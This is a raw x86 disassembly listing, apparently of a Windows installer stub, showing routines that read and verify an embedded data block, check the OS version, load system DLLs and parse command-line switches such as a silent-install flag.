  4032ae:	e8 ee 2e 00 00       	call   0x4061a1
  4032b3:	53                   	push   %ebx
  4032b4:	68 00 01 00 04       	push   $0x4000100
  4032b9:	6a 02                	push   $0x2
  4032bb:	53                   	push   %ebx
  4032bc:	53                   	push   %ebx
  4032bd:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4032c3:	68 00 00 00 c0       	push   $0xc0000000
  4032c8:	50                   	push   %eax
  4032c9:	ff 15 cc 80 40 00    	call   *0x4080cc
  4032cf:	83 f8 ff             	cmp    $0xffffffff,%eax
  4032d2:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  4032d7:	75 14                	jne    0x4032ed
  4032d9:	b8 30 a2 40 00       	mov    $0x40a230,%eax
  4032de:	e9 8c 00 00 00       	jmp    0x40336f
  4032e3:	6a 01                	push   $0x1
  4032e5:	e8 49 fd ff ff       	call   0x403033
  4032ea:	59                   	pop    %ecx
  4032eb:	eb 3a                	jmp    0x403327
  4032ed:	a1 74 9a 42 00       	mov    0x429a74,%eax
  4032f2:	83 c0 1c             	add    $0x1c,%eax
  4032f5:	50                   	push   %eax
  4032f6:	e8 02 03 00 00       	call   0x4035fd
  4032fb:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4032fe:	ff 75 f0             	push   -0x10(%ebp)
  403301:	f7 d1                	not    %ecx
  403303:	83 e1 04             	and    $0x4,%ecx
  403306:	a3 04 0f 42 00       	mov    %eax,0x420f04
  40330b:	2b c1                	sub    %ecx,%eax
  40330d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403310:	56                   	push   %esi
  403311:	53                   	push   %ebx
  403312:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  403316:	6a ff                	push   $0xffffffff
  403318:	a3 f8 0e 42 00       	mov    %eax,0x420ef8
  40331d:	e8 54 00 00 00       	call   0x403376
  403322:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  403325:	74 07                	je     0x40332e
  403327:	b8 98 a0 40 00       	mov    $0x40a098,%eax
  40332c:	eb 41                	jmp    0x40336f
  40332e:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  403332:	89 35 70 9a 42 00    	mov    %esi,0x429a70
  403338:	8b 06                	mov    (%esi),%eax
  40333a:	a3 78 9a 42 00       	mov    %eax,0x429a78
  40333f:	74 06                	je     0x403347
  403341:	ff 05 7c 9a 42 00    	incl   0x429a7c
  403347:	6a 08                	push   $0x8
  403349:	8d 46 44             	lea    0x44(%esi),%eax
  40334c:	59                   	pop    %ecx
  40334d:	83 e8 08             	sub    $0x8,%eax
  403350:	01 30                	add    %esi,(%eax)
  403352:	49                   	dec    %ecx
  403353:	75 f8                	jne    0x40334d
  403355:	a1 f4 0e 42 00       	mov    0x420ef4,%eax
  40335a:	6a 40                	push   $0x40
  40335c:	89 46 3c             	mov    %eax,0x3c(%esi)
  40335f:	83 c6 04             	add    $0x4,%esi
  403362:	56                   	push   %esi
  403363:	68 80 9a 42 00       	push   $0x429a80
  403368:	e8 c0 2d 00 00       	call   0x40612d
  40336d:	33 c0                	xor    %eax,%eax
  40336f:	5f                   	pop    %edi
  403370:	5e                   	pop    %esi
  403371:	5b                   	pop    %ebx
  403372:	c9                   	leave
  403373:	c2 04 00             	ret    $0x4
  403376:	55                   	push   %ebp
  403377:	8b ec                	mov    %esp,%ebp
  403379:	51                   	push   %ecx
  40337a:	8b 45 08             	mov    0x8(%ebp),%eax
  40337d:	53                   	push   %ebx
  40337e:	56                   	push   %esi
  40337f:	33 f6                	xor    %esi,%esi
  403381:	3b c6                	cmp    %esi,%eax
  403383:	7c 1c                	jl     0x4033a1
  403385:	8b 0d b8 9a 42 00    	mov    0x429ab8,%ecx
  40338b:	56                   	push   %esi
  40338c:	03 c1                	add    %ecx,%eax
  40338e:	56                   	push   %esi
  40338f:	50                   	push   %eax
  403390:	a3 f4 0e 42 00       	mov    %eax,0x420ef4
  403395:	ff 35 1c a0 40 00    	push   0x40a01c
  40339b:	ff 15 34 81 40 00    	call   *0x408134
  4033a1:	6a 04                	push   $0x4
  4033a3:	e8 d6 00 00 00       	call   0x40347e
  4033a8:	3b c6                	cmp    %esi,%eax
  4033aa:	0f 8c c8 00 00 00    	jl     0x403478
  4033b0:	8d 45 08             	lea    0x8(%ebp),%eax
  4033b3:	6a 04                	push   $0x4
  4033b5:	50                   	push   %eax
  4033b6:	ff 35 1c a0 40 00    	push   0x40a01c
  4033bc:	e8 34 2e 00 00       	call   0x4061f5
  4033c1:	85 c0                	test   %eax,%eax
  4033c3:	0f 84 9f 00 00 00    	je     0x403468
  4033c9:	ff 75 08             	push   0x8(%ebp)
  4033cc:	83 05 f4 0e 42 00 04 	addl   $0x4,0x420ef4
  4033d3:	e8 a6 00 00 00       	call   0x40347e
  4033d8:	8b d8                	mov    %eax,%ebx
  4033da:	3b de                	cmp    %esi,%ebx
  4033dc:	0f 8c 94 00 00 00    	jl     0x403476
  4033e2:	39 75 10             	cmp    %esi,0x10(%ebp)
  4033e5:	75 5d                	jne    0x403444
  4033e7:	39 75 08             	cmp    %esi,0x8(%ebp)
  4033ea:	0f 8e 86 00 00 00    	jle    0x403476
  4033f0:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  4033f5:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  4033fc:	8b 45 08             	mov    0x8(%ebp),%eax
  4033ff:	7c 05                	jl     0x403406
  403401:	b8 00 40 00 00       	mov    $0x4000,%eax
  403406:	50                   	push   %eax
  403407:	56                   	push   %esi
  403408:	ff 35 1c a0 40 00    	push   0x40a01c
  40340e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403411:	e8 df 2d 00 00       	call   0x4061f5
  403416:	85 c0                	test   %eax,%eax
  403418:	74 4e                	je     0x403468
  40341a:	ff 75 fc             	push   -0x4(%ebp)
  40341d:	56                   	push   %esi
  40341e:	ff 75 0c             	push   0xc(%ebp)
  403421:	e8 fe 2d 00 00       	call   0x406224
  403426:	85 c0                	test   %eax,%eax
  403428:	74 16                	je     0x403440
  40342a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40342d:	29 45 08             	sub    %eax,0x8(%ebp)
  403430:	01 05 f4 0e 42 00    	add    %eax,0x420ef4
  403436:	03 d8                	add    %eax,%ebx
  403438:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40343c:	7f b7                	jg     0x4033f5
  40343e:	eb 36                	jmp    0x403476
  403440:	6a fe                	push   $0xfffffffe
  403442:	eb 26                	jmp    0x40346a
  403444:	8b 45 08             	mov    0x8(%ebp),%eax
  403447:	3b 45 14             	cmp    0x14(%ebp),%eax
  40344a:	7c 03                	jl     0x40344f
  40344c:	8b 45 14             	mov    0x14(%ebp),%eax
  40344f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403452:	56                   	push   %esi
  403453:	51                   	push   %ecx
  403454:	50                   	push   %eax
  403455:	ff 75 10             	push   0x10(%ebp)
  403458:	ff 35 1c a0 40 00    	push   0x40a01c
  40345e:	ff 15 30 81 40 00    	call   *0x408130
  403464:	85 c0                	test   %eax,%eax
  403466:	75 05                	jne    0x40346d
  403468:	6a fd                	push   $0xfffffffd
  40346a:	58                   	pop    %eax
  40346b:	eb 0b                	jmp    0x403478
  40346d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403470:	01 1d f4 0e 42 00    	add    %ebx,0x420ef4
  403476:	8b c3                	mov    %ebx,%eax
  403478:	5e                   	pop    %esi
  403479:	5b                   	pop    %ebx
  40347a:	c9                   	leave
  40347b:	c2 10 00             	ret    $0x10
  40347e:	53                   	push   %ebx
  40347f:	55                   	push   %ebp
  403480:	56                   	push   %esi
  403481:	8b 35 f4 0e 42 00    	mov    0x420ef4,%esi
  403487:	2b 35 60 ce 40 00    	sub    0x40ce60,%esi
  40348d:	57                   	push   %edi
  40348e:	03 74 24 14          	add    0x14(%esp),%esi
  403492:	ff 15 d0 80 40 00    	call   *0x4080d0
  403498:	33 db                	xor    %ebx,%ebx
  40349a:	05 f4 01 00 00       	add    $0x1f4,%eax
  40349f:	3b f3                	cmp    %ebx,%esi
  4034a1:	a3 6c 9a 42 00       	mov    %eax,0x429a6c
  4034a6:	0f 8e 2a 01 00 00    	jle    0x4035d6
  4034ac:	ff 35 04 0f 42 00    	push   0x420f04
  4034b2:	e8 46 01 00 00       	call   0x4035fd
  4034b7:	53                   	push   %ebx
  4034b8:	53                   	push   %ebx
  4034b9:	ff 35 60 ce 40 00    	push   0x40ce60
  4034bf:	ff 35 1c a0 40 00    	push   0x40a01c
  4034c5:	ff 15 34 81 40 00    	call   *0x408134
  4034cb:	89 35 00 0f 42 00    	mov    %esi,0x420f00
  4034d1:	89 1d f0 0e 42 00    	mov    %ebx,0x420ef0
  4034d7:	bd f0 ce 40 00       	mov    $0x40cef0,%ebp
  4034dc:	a1 f8 0e 42 00       	mov    0x420ef8,%eax
  4034e1:	bf 00 40 00 00       	mov    $0x4000,%edi
  4034e6:	2b 05 04 0f 42 00    	sub    0x420f04,%eax
  4034ec:	3b c7                	cmp    %edi,%eax
  4034ee:	7f 02                	jg     0x4034f2
  4034f0:	8b f8                	mov    %eax,%edi
  4034f2:	be f0 4e 41 00       	mov    $0x414ef0,%esi
  4034f7:	57                   	push   %edi
  4034f8:	56                   	push   %esi
  4034f9:	e8 e9 00 00 00       	call   0x4035e7
  4034fe:	85 c0                	test   %eax,%eax
  403500:	0f 84 c2 00 00 00    	je     0x4035c8
  403506:	01 3d 04 0f 42 00    	add    %edi,0x420f04
  40350c:	89 35 80 ce 40 00    	mov    %esi,0x40ce80
  403512:	89 3d 84 ce 40 00    	mov    %edi,0x40ce84
  403518:	39 1d 70 9a 42 00    	cmp    %ebx,0x429a70
  40351e:	74 29                	je     0x403549
  403520:	39 1d 00 9b 42 00    	cmp    %ebx,0x429b00
  403526:	75 21                	jne    0x403549
  403528:	a1 00 0f 42 00       	mov    0x420f00,%eax
  40352d:	53                   	push   %ebx
  40352e:	2b 05 f4 0e 42 00    	sub    0x420ef4,%eax
  403534:	2b 44 24 18          	sub    0x18(%esp),%eax
  403538:	03 05 60 ce 40 00    	add    0x40ce60,%eax
  40353e:	a3 f0 0e 42 00       	mov    %eax,0x420ef0
  403543:	e8 eb fa ff ff       	call   0x403033
  403548:	59                   	pop    %ecx
  403549:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  40354e:	89 2d 88 ce 40 00    	mov    %ebp,0x40ce88
  403554:	c7 05 8c ce 40 00 00 	movl   $0x8000,0x40ce8c
  40355b:	80 00 00 
  40355e:	e8 8e 36 00 00       	call   0x406bf1
  403563:	85 c0                	test   %eax,%eax
  403565:	7c 6a                	jl     0x4035d1
  403567:	8b 35 88 ce 40 00    	mov    0x40ce88,%esi
  40356d:	2b f5                	sub    %ebp,%esi
  40356f:	74 21                	je     0x403592
  403571:	56                   	push   %esi
  403572:	55                   	push   %ebp
  403573:	ff 35 1c a0 40 00    	push   0x40a01c
  403579:	e8 a6 2c 00 00       	call   0x406224
  40357e:	85 c0                	test   %eax,%eax
  403580:	74 4b                	je     0x4035cd
  403582:	01 35 60 ce 40 00    	add    %esi,0x40ce60
  403588:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  40358e:	75 88                	jne    0x403518
  403590:	eb 0c                	jmp    0x40359e
  403592:	39 1d 84 ce 40 00    	cmp    %ebx,0x40ce84
  403598:	75 37                	jne    0x4035d1
  40359a:	3b fb                	cmp    %ebx,%edi
  40359c:	74 33                	je     0x4035d1
  40359e:	a1 f4 0e 42 00       	mov    0x420ef4,%eax
  4035a3:	8b c8                	mov    %eax,%ecx
  4035a5:	2b 0d 60 ce 40 00    	sub    0x40ce60,%ecx
  4035ab:	03 4c 24 14          	add    0x14(%esp),%ecx
  4035af:	85 c9                	test   %ecx,%ecx
  4035b1:	0f 8f 25 ff ff ff    	jg     0x4034dc
  4035b7:	53                   	push   %ebx
  4035b8:	53                   	push   %ebx
  4035b9:	50                   	push   %eax
  4035ba:	ff 35 1c a0 40 00    	push   0x40a01c
  4035c0:	ff 15 34 81 40 00    	call   *0x408134
  4035c6:	eb 0e                	jmp    0x4035d6
  4035c8:	83 c8 ff             	or     $0xffffffff,%eax
  4035cb:	eb 13                	jmp    0x4035e0
  4035cd:	6a fe                	push   $0xfffffffe
  4035cf:	eb 02                	jmp    0x4035d3
  4035d1:	6a fd                	push   $0xfffffffd
  4035d3:	58                   	pop    %eax
  4035d4:	eb 0a                	jmp    0x4035e0
  4035d6:	6a 01                	push   $0x1
  4035d8:	e8 56 fa ff ff       	call   0x403033
  4035dd:	59                   	pop    %ecx
  4035de:	33 c0                	xor    %eax,%eax
  4035e0:	5f                   	pop    %edi
  4035e1:	5e                   	pop    %esi
  4035e2:	5d                   	pop    %ebp
  4035e3:	5b                   	pop    %ebx
  4035e4:	c2 04 00             	ret    $0x4
  4035e7:	ff 74 24 08          	push   0x8(%esp)
  4035eb:	ff 74 24 08          	push   0x8(%esp)
  4035ef:	ff 35 18 a0 40 00    	push   0x40a018
  4035f5:	e8 fb 2b 00 00       	call   0x4061f5
  4035fa:	c2 08 00             	ret    $0x8
  4035fd:	6a 00                	push   $0x0
  4035ff:	6a 00                	push   $0x0
  403601:	ff 74 24 0c          	push   0xc(%esp)
  403605:	ff 35 18 a0 40 00    	push   0x40a018
  40360b:	ff 15 34 81 40 00    	call   *0x408134
  403611:	c2 04 00             	ret    $0x4
  403614:	56                   	push   %esi
  403615:	be 00 68 43 00       	mov    $0x436800,%esi
  40361a:	56                   	push   %esi
  40361b:	e8 10 33 00 00       	call   0x406930
  403620:	56                   	push   %esi
  403621:	e8 a2 29 00 00       	call   0x405fc8
  403626:	85 c0                	test   %eax,%eax
  403628:	75 02                	jne    0x40362c
  40362a:	5e                   	pop    %esi
  40362b:	c3                   	ret
  40362c:	56                   	push   %esi
  40362d:	e8 1f 29 00 00       	call   0x405f51
  403632:	56                   	push   %esi
  403633:	e8 f8 25 00 00       	call   0x405c30
  403638:	56                   	push   %esi
  403639:	68 00 60 43 00       	push   $0x436000
  40363e:	e8 5e 2b 00 00       	call   0x4061a1
  403643:	5e                   	pop    %esi
  403644:	c3                   	ret
  403645:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  40364b:	55                   	push   %ebp
  40364c:	56                   	push   %esi
  40364d:	57                   	push   %edi
  40364e:	6a 20                	push   $0x20
  403650:	5f                   	pop    %edi
  403651:	33 ed                	xor    %ebp,%ebp
  403653:	68 01 80 00 00       	push   $0x8001
  403658:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40365c:	c7 44 24 18 30 a2 40 	movl   $0x40a230,0x18(%esp)
  403663:	00 
  403664:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403668:	ff 15 a0 80 40 00    	call   *0x4080a0
  40366e:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  403674:	8d 44 24 34          	lea    0x34(%esp),%eax
  403678:	50                   	push   %eax
  403679:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  40367d:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  403684:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  40368b:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  403692:	00 
  403693:	ff d6                	call   *%esi
  403695:	85 c0                	test   %eax,%eax
  403697:	75 38                	jne    0x4036d1
  403699:	8d 44 24 34          	lea    0x34(%esp),%eax
  40369d:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4036a4:	00 
  4036a5:	50                   	push   %eax
  4036a6:	ff d6                	call   *%esi
  4036a8:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  4036ad:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  4036b1:	66 2d 53 00          	sub    $0x53,%ax
  4036b5:	83 c1 d0             	add    $0xffffffd0,%ecx
  4036b8:	66 f7 d8             	neg    %ax
  4036bb:	1b c0                	sbb    %eax,%eax
  4036bd:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  4036c4:	04 
  4036c5:	f7 d0                	not    %eax
  4036c7:	23 c1                	and    %ecx,%eax
  4036c9:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  4036d0:	00 
  4036d1:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  4036d6:	73 06                	jae    0x4036de
  4036d8:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  4036de:	8b 44 24 40          	mov    0x40(%esp),%eax
  4036e2:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  4036e7:	a3 18 9b 42 00       	mov    %eax,0x429b18
  4036ec:	33 c0                	xor    %eax,%eax
  4036ee:	8a 64 24 38          	mov    0x38(%esp),%ah
  4036f2:	0f b7 c0             	movzwl %ax,%eax
  4036f5:	0b c1                	or     %ecx,%eax
  4036f7:	33 c9                	xor    %ecx,%ecx
  4036f9:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403700:	0f b7 c9             	movzwl %cx,%ecx
  403703:	c1 e0 10             	shl    $0x10,%eax
  403706:	0b c1                	or     %ecx,%eax
  403708:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  40370f:	00 
  403710:	0b c1                	or     %ecx,%eax
  403712:	a3 1c 9b 42 00       	mov    %eax,0x429b1c
  403717:	66 81 3d 1e 9b 42 00 	cmpw   $0x600,0x429b1e
  40371e:	00 06 
  403720:	74 11                	je     0x403733
  403722:	55                   	push   %ebp
  403723:	e8 4e 33 00 00       	call   0x406a76
  403728:	3b c5                	cmp    %ebp,%eax
  40372a:	74 07                	je     0x403733
  40372c:	68 00 0c 00 00       	push   $0xc00
  403731:	ff d0                	call   *%eax
  403733:	be a8 82 40 00       	mov    $0x4082a8,%esi
  403738:	56                   	push   %esi
  403739:	e8 c8 32 00 00       	call   0x406a06
  40373e:	56                   	push   %esi
  40373f:	ff 15 28 81 40 00    	call   *0x408128
  403745:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403749:	80 3e 00             	cmpb   $0x0,(%esi)
  40374c:	75 ea                	jne    0x403738
  40374e:	6a 0c                	push   $0xc
  403750:	e8 21 33 00 00       	call   0x406a76
  403755:	6a 0a                	push   $0xa
  403757:	e8 1a 33 00 00       	call   0x406a76
  40375c:	6a 08                	push   $0x8
  40375e:	a3 64 9a 42 00       	mov    %eax,0x429a64
  403763:	e8 0e 33 00 00       	call   0x406a76
  403768:	3b c5                	cmp    %ebp,%eax
  40376a:	74 0f                	je     0x40377b
  40376c:	6a 1e                	push   $0x1e
  40376e:	ff d0                	call   *%eax
  403770:	85 c0                	test   %eax,%eax
  403772:	74 07                	je     0x40377b
  403774:	80 0d 1c 9b 42 00 80 	orb    $0x80,0x429b1c
  40377b:	53                   	push   %ebx
  40377c:	ff 15 38 80 40 00    	call   *0x408038
  403782:	55                   	push   %ebp
  403783:	ff 15 98 82 40 00    	call   *0x408298
  403789:	a3 20 9b 42 00       	mov    %eax,0x429b20
  40378e:	55                   	push   %ebp
  40378f:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  403796:	68 b4 02 00 00       	push   $0x2b4
  40379b:	50                   	push   %eax
  40379c:	55                   	push   %ebp
  40379d:	68 08 0f 42 00       	push   $0x420f08
  4037a2:	ff 15 7c 81 40 00    	call   *0x40817c
  4037a8:	68 78 a3 40 00       	push   $0x40a378
  4037ad:	68 60 8a 42 00       	push   $0x428a60
  4037b2:	e8 cb 2e 00 00       	call   0x406682
  4037b7:	ff 15 a8 80 40 00    	call   *0x4080a8
  4037bd:	bb 00 40 43 00       	mov    $0x434000,%ebx
  4037c2:	50                   	push   %eax
  4037c3:	53                   	push   %ebx
  4037c4:	e8 b9 2e 00 00       	call   0x406682
  4037c9:	6a 22                	push   $0x22
  4037cb:	c7 05 60 9a 42 00 00 	movl   $0x400000,0x429a60
  4037d2:	00 40 00 
  4037d5:	5e                   	pop    %esi
  4037d6:	8b c3                	mov    %ebx,%eax
  4037d8:	66 39 35 00 40 43 00 	cmp    %si,0x434000
  4037df:	75 07                	jne    0x4037e8
  4037e1:	8b fe                	mov    %esi,%edi
  4037e3:	b8 02 40 43 00       	mov    $0x434002,%eax
  4037e8:	57                   	push   %edi
  4037e9:	50                   	push   %eax
  4037ea:	e8 8f 27 00 00       	call   0x405f7e
  4037ef:	50                   	push   %eax
  4037f0:	ff 15 08 82 40 00    	call   *0x408208
  4037f6:	8b c8                	mov    %eax,%ecx
  4037f8:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4037fc:	e9 f6 00 00 00       	jmp    0x4038f7
  403801:	6a 20                	push   $0x20
  403803:	5a                   	pop    %edx
  403804:	66 3b c2             	cmp    %dx,%ax
  403807:	75 07                	jne    0x403810
  403809:	41                   	inc    %ecx
  40380a:	41                   	inc    %ecx
  40380b:	66 39 11             	cmp    %dx,(%ecx)
  40380e:	74 f9                	je     0x403809
  403810:	66 39 31             	cmp    %si,(%ecx)
  403813:	89 54 24 10          	mov    %edx,0x10(%esp)
  403817:	75 06                	jne    0x40381f
  403819:	41                   	inc    %ecx
  40381a:	89 74 24 10          	mov    %esi,0x10(%esp)
  40381e:	41                   	inc    %ecx
  40381f:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  403823:	0f 85 bb 00 00 00    	jne    0x4038e4
  403829:	41                   	inc    %ecx
  40382a:	41                   	inc    %ecx
  40382b:	66 83 39 53          	cmpw   $0x53,(%ecx)
  40382f:	75 18                	jne    0x403849
  403831:	66 8b 41 02          	mov    0x2(%ecx),%ax
  403835:	66 3b c2             	cmp    %dx,%ax
  403838:	74 05                	je     0x40383f
  40383a:	66 3b c5             	cmp    %bp,%ax
  40383d:	75 0a                	jne    0x403849
  40383f:	c7 05 00 9b 42 00 01 	movl   $0x1,0x429b00
  403846:	00 00 00 
  403849:	0f b7 05 72 a3 40 00 	movzwl 0x40a372,%eax
  403850:	99                   	cltd
  403851:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403855:	c1 e0 10             	shl    $0x10,%eax
  403858:	8b f8                	mov    %eax,%edi
  40385a:	33 f6                	xor    %esi,%esi
  40385c:	0f b7 05 70 a3 40 00 	movzwl 0x40a370,%eax
  403863:	99                   	cltd
  403864:	0f b7 15 6c a3 40 00 	movzwl 0x40a36c,%edx
  40386b:	0b f8                	or     %eax,%edi
  40386d:	0f b7 05 6e a3 40 00 	movzwl 0x40a36e,%eax
  403874:	c1 e0 10             	shl    $0x10,%eax
  403877:	0b c2                	or     %edx,%eax
  403879:	99                   	cltd
  40387a:	0b f0                	or     %eax,%esi
  40387c:	8b 01                	mov    (%ecx),%eax
  40387e:	0b fa                	or     %edx,%edi
  403880:	3b c6                	cmp    %esi,%eax
  403882:	75 1b                	jne    0x40389f
  403884:	8b 41 04             	mov    0x4(%ecx),%eax
  403887:	3b c7                	cmp    %edi,%eax
  403889:	75 14                	jne    0x40389f
  40388b:	66 8b 41 08          	mov    0x8(%ecx),%ax
  40388f:	66 3d 20 00          	cmp    $0x20,%ax
  403893:	74 05                	je     0x40389a
  403895:	66 3b c5             	cmp    %bp,%ax
  403898:	75 05                	jne    0x40389f
  40389a:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  40389f:	0f b7 05 66 a3 40 00 	movzwl 0x40a366,%eax
  4038a6:	99                   	cltd
  4038a7:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4038ab:	c1 e0 10             	shl    $0x10,%eax
  4038ae:	8b f8                	mov    %eax,%edi
  4038b0:	33 f6                	xor    %esi,%esi
  4038b2:	0f b7 05 64 a3 40 00 	movzwl 0x40a364,%eax
  4038b9:	99                   	cltd
  4038ba:	0f b7 15 60 a3 40 00 	movzwl 0x40a360,%edx
  4038c1:	0b f8                	or     %eax,%edi
  4038c3:	0f b7 05 62 a3 40 00 	movzwl 0x40a362,%eax
  4038ca:	c1 e0 10             	shl    $0x10,%eax
  4038cd:	0b c2                	or     %edx,%eax
  4038cf:	99                   	cltd
  4038d0:	0b f0                	or     %eax,%esi
  4038d2:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4038d5:	0b fa                	or     %edx,%edi
  4038d7:	3b c6                	cmp    %esi,%eax
  4038d9:	75 06                	jne    0x4038e1
  4038db:	8b 01                	mov    (%ecx),%eax
  4038dd:	3b c7                	cmp    %edi,%eax
  4038df:	74 24                	je     0x403905
  4038e1:	6a 22                	push   $0x22
  4038e3:	5e                   	pop    %esi
  4038e4:	ff 74 24 10          	push   0x10(%esp)
  4038e8:	51                   	push   %ecx
  4038e9:	e8 90 26 00 00       	call   0x405f7e
  4038ee:	8b c8                	mov    %eax,%ecx
  4038f0:	66 39 31             	cmp    %si,(%ecx)
  4038f3:	75 02                	jne    0x4038f7
  4038f5:	41                   	inc    %ecx
  4038f6:	41                   	inc    %ecx
  4038f7:	66 8b 01             	mov    (%ecx),%ax
  4038fa:	66 3b c5             	cmp    %bp,%ax
  4038fd:	0f 85 fe fe ff ff    	jne    0x403801
  403903:	eb 12                	jmp    0x403917
  403905:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  403909:	83 c1 04             	add    $0x4,%ecx
  40390c:	51                   	push   %ecx
  40390d:	68 00 48 43 00       	push   $0x434800
  403912:	e8 6b 2d 00 00       	call   0x406682
  403917:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  40391d:	be 00 68 43 00       	mov    $0x436800,%esi
  403922:	56                   	push   %esi
  403923:	68 00 04 00 00       	push   $0x400
  403928:	ff d7                	call   *%edi
  40392a:	e8 e5 fc ff ff       	call   0x403614
  40392f:	85 c0                	test   %eax,%eax
  403931:	75 56                	jne    0x403989
  403933:	68 fb 03 00 00       	push   $0x3fb
  403938:	56                   	push   %esi
  403939:	ff 15 b0 80 40 00    	call   *0x4080b0
  40393f:	68 54 a3 40 00       	push   $0x40a354
  403944:	56                   	push   %esi
  403945:	e8 54 2d 00 00       	call   0x40669e
  40394a:	e8 c5 fc ff ff       	call   0x403614
  40394f:	85 c0                	test   %eax,%eax
  403951:	75 36                	jne    0x403989
  403953:	56                   	push   %esi
  403954:	68 fc 03 00 00       	push   $0x3fc
  403959:	ff d7                	call   *%edi
  40395b:	68 4c a3 40 00       	push   $0x40a34c
  403960:	56                   	push   %esi
  403961:	e8 38 2d 00 00       	call   0x40669e
  403966:	8b 3d b4 80 40 00    	mov    0x4080b4,%edi
  40396c:	56                   	push   %esi
  40396d:	68 40 a3 40 00       	push   $0x40a340
  403972:	ff d7                	call   *%edi
  403974:	56                   	push   %esi
  403975:	68 38 a3 40 00       	push   $0x40a338
  40397a:	ff d7                	call   *%edi
  40397c:	e8 93 fc ff ff       	call   0x403614
  403981:	85 c0                	test   %eax,%eax
  403983:	0f 84 07 02 00 00    	je     0x403b90
  403989:	68 00 60 43 00       	push   $0x436000
  40398e:	ff 15 44 81 40 00    	call   *0x408144
  403994:	ff 74 24 14          	push   0x14(%esp)
  403998:	e8 38 f7 ff ff       	call   0x4030d5
  40399d:	3b c5                	cmp    %ebp,%eax
  40399f:	89 44 24 18          	mov    %eax,0x18(%esp)
  4039a3:	0f 85 e7 01 00 00    	jne    0x403b90
  4039a9:	39 2d 7c 9a 42 00    	cmp    %ebp,0x429a7c
  4039af:	0f 84 93 00 00 00    	je     0x403a48
  4039b5:	55                   	push   %ebp
  4039b6:	53                   	push   %ebx
  4039b7:	e8 c2 25 00 00       	call   0x405f7e
  4039bc:	8b f8                	mov    %eax,%edi
  4039be:	3b fb                	cmp    %ebx,%edi
  4039c0:	72 4c                	jb     0x403a0e
  4039c2:	0f b7 05 32 a3 40 00 	movzwl 0x40a332,%eax
  4039c9:	99                   	cltd
  4039ca:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4039ce:	c1 e0 10             	shl    $0x10,%eax
  4039d1:	8b e8                	mov    %eax,%ebp
  4039d3:	0f b7 05 30 a3 40 00 	movzwl 0x40a330,%eax
  4039da:	0f b7 0d 2c a3 40 00 	movzwl 0x40a32c,%ecx
  4039e1:	99                   	cltd
  4039e2:	0b e8                	or     %eax,%ebp
  4039e4:	0f b7 05 2e a3 40 00 	movzwl 0x40a32e,%eax
  4039eb:	c1 e0 10             	shl    $0x10,%eax
  4039ee:	0b c1                	or     %ecx,%eax
  4039f0:	33 c9                	xor    %ecx,%ecx
  4039f2:	99                   	cltd
  4039f3:	0b c8                	or     %eax,%ecx
  4039f5:	8b c5                	mov    %ebp,%eax
  4039f7:	0b c2                	or     %edx,%eax
  4039f9:	8b 17                	mov    (%edi),%edx
  4039fb:	3b d1                	cmp    %ecx,%edx
  4039fd:	75 07                	jne    0x403a06
  4039ff:	8b 57 04             	mov    0x4(%edi),%edx
  403a02:	3b d0                	cmp    %eax,%edx
  403a04:	74 06                	je     0x403a0c
  403a06:	4f                   	dec    %edi
  403a07:	4f                   	dec    %edi
  403a08:	3b fb                	cmp    %ebx,%edi
  403a0a:	73 ed                	jae    0x4039f9
  403a0c:	33 ed                	xor    %ebp,%ebp
  403a0e:	3b fb                	cmp    %ebx,%edi
  403a10:	c7 44 24 18 b8 a2 40 	movl   $0x40a2b8,0x18(%esp)
  403a17:	00 
  403a18:	72 43                	jb     0x403a5d
  403a1a:	66 89 2f             	mov    %bp,(%edi)
  403a1d:	83 c7 08             	add    $0x8,%edi
  403a20:	57                   	push   %edi
  403a21:	e8 33 26 00 00       	call   0x406059
  403a26:	85 c0                	test   %eax,%eax
  403a28:	0f 84 62 01 00 00    	je     0x403b90
  403a2e:	57                   	push   %edi
  403a2f:	68 00 48 43 00       	push   $0x434800
  403a34:	e8 49 2c 00 00       	call   0x406682
  403a39:	57                   	push   %edi
